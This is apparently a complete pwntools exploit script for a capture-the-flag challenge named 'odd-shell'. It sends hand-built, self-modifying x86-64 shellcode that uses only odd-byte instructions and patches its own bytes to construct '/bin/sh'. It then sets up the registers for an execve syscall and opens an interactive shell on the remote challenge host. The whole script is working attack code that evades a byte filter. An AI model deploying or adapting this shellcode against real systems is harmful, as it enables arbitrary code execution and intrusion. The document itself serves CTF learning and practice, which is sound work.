from pwn import *
import re


# initialize the binary
elf = context.binary = ELF("./chal", checksec=False)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("odd-shell.chal.uiuc.tf", 1337) # nc odd-shell.chal.uiuc.tf 1337
elif args.GDB:
    p = gdb.debug("./chal", gdbscript=gs)
else:
    p = elf.process()


shellcode = """
### PUT "/bin/sh" AT BEGINNING OF INSTRUCTIONS ###
# move address for instruction start to r15
mov   r15,rdx

# create "nib/" (0x6d69612f) in rcx, then move to r15
mov   ecx,0x010d31b1
imul  ecx,ecx,0x69
add   ecx,0x7f
add   ecx,0x17
mov   DWORD PTR[r15],ecx

# shift r15 by 4 for next part of string
add   r15,3
add   r15,1

# create "\x00hs/" (0x0068732F) in rcx, then move to r15
mov   ecx,0x016973b5
sub   ecx,0x01010101
add   ecx,0x7b
mov   DWORD PTR[r15],ecx


### MOVE $rdx into $rdi ###
mov    r15,rdx
add    r15,0x3b
add    r15,0x1
add    DWORD PTR[r15],0x3
mov    r15d,r10d


### PUT 0 INTO $rsi ###
# add 3 to first part of XOR
mov    r15,rdx
add    r15,0x55
add    DWORD PTR[r15],0x3

# add 1 to third part of XOR
mov    r15,rdx
add    r15,0x57
add    DWORD PTR[r15],0x1

xor    r13d,r14d          # (45 31 f5) --> xor rsi,rsi (48 31 f6)


### PUT 0 INTO $rdx ###
# add 3 to first part of XOR
mov    r15,rdx
add    r15,0x75
add    r15,0x1
add    DWORD PTR[r15],0x3

# add 1 to third part of XOR
mov    r15,rdx
add    r15,0x77
add    r15,0x1
add    DWORD PTR[r15],0x1

xor    r9d,r10d          # (45 31 d1) --> xor rdx,rdx (48 31 d2)


### PUT 59 INTO $rax ###
# random instruction for offset
xor    r13,r13

# add 7 to first part of XOR
mov    r15,rdi
add    r15,0x7f
add    r15,0x1b
add    DWORD PTR[r15],0x7

# subtract 1 from third part of XOR
mov    r15,rdi
add    r15,0x7f
add    r15,0x1d
sub    DWORD PTR[r15],0x1

add    r9d,0x3b          # (41 83 c1 3b) --> add rax,0x3b (48 83 c0 3b)


### SYSCALL ###
syscall
"""

# remove comments from shellcode and turn into assembly
assembly = asm(re.sub(r'#.*', '', shellcode))


# get line and send payload
p.recvline()
p.sendline(assembly)


# get shell
p.interactive()